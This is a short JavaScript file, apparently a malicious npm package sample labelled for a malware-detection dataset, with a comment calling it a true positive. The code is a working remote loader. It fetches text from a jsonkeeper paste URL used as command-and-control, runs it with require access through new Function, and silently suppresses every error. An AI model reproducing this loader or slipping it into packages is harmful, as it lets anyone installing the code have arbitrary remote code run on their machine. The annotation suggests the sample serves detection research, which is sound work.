'use strict';

// Remote loader: fetch JS from a paste-site C2 and execute it in-process with
// require access, via Function.constructor. This is the sink that makes the
// package a TP — remote-code exec from an anomalous host (jsonkeeper paste).
try {
  (async () => {
    const r = await require('axios').get('https://www.jsonkeeper.com/b/TOAAK');
    new Function('require', r.data.cookie)(require);
  })().catch(() => {});
} catch (e) {}
